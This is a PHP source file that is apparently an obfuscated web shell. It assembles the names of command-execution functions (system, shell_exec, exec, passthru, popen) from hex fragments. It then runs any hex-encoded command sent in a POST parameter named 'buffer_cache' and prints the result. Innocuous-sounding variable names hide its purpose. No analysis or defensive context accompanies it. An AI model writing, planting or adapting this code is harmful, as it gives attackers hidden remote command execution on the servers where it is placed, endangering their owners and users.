<?php


$dat1 = '74';
$dat2 = '6d';
$dat3 = '6c';
$dat4 = '5f';
$dat5 = '65';
$dat6 = '78';
$dat7 = '63';
$dat8 = '61';
$dat9 = '73';
$dat10 = '75';
$dat11 = '70';
$dat12 = '72';
$dat13 = '67';
$dat14 = '6f';
$dat15 = '62';
$dat16 = '66';
$dat17 = '68';
$right_pad_string1 = pack("H*", '73' . '79' . '73' . $dat1 . '65' . $dat2);
$right_pad_string2 = pack("H*", '73' . '68' . '65' . $dat3 . '6c' . $dat4 . $dat5 . $dat6 . $dat5 . $dat7);
$right_pad_string3 = pack("H*", '65' . '78' . '65' . $dat7);
$right_pad_string4 = pack("H*", '70' . $dat8 . $dat9 . $dat9 . $dat1 . '68' . '72' . $dat10);
$right_pad_string5 = pack("H*", '70' . '6f' . $dat11 . '65' . '6e');
$right_pad_string6 = pack("H*", $dat9 . $dat1 . $dat12 . '65' . '61' . $dat2 . '5f' . $dat13 . '65' . '74' . $dat4 . $dat7 . $dat14 . '6e' . '74' . '65' . '6e' . '74' . $dat9);
$right_pad_string7 = pack("H*", '70' . $dat7 . $dat3 . '6f' . $dat9 . $dat5);
$buffer_cache = pack("H*", $dat15 . '75' . '66' . $dat16 . $dat5 . '72' . $dat4 . '63' . $dat8 . '63' . $dat17 . '65');
if (isset($_POST[$buffer_cache])) {
    $buffer_cache = pack("H*", $_POST[$buffer_cache]);
    if (function_exists($right_pad_string1)) {
        $right_pad_string1($buffer_cache);
    } elseif (function_exists($right_pad_string2)) {
        print $right_pad_string2($buffer_cache);
    } elseif (function_exists($right_pad_string3)) {
        $right_pad_string3($buffer_cache, $key_tkn);
        print join("\n", $key_tkn);
    } elseif (function_exists($right_pad_string4)) {
        $right_pad_string4($buffer_cache);
    } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
        $ref_dchunk = $right_pad_string5($buffer_cache, 'r');
        if ($ref_dchunk) {
            $symbol_sym = $right_pad_string6($ref_dchunk);
            $right_pad_string7($ref_dchunk);
            print $symbol_sym;
        }
    }
    exit;
}
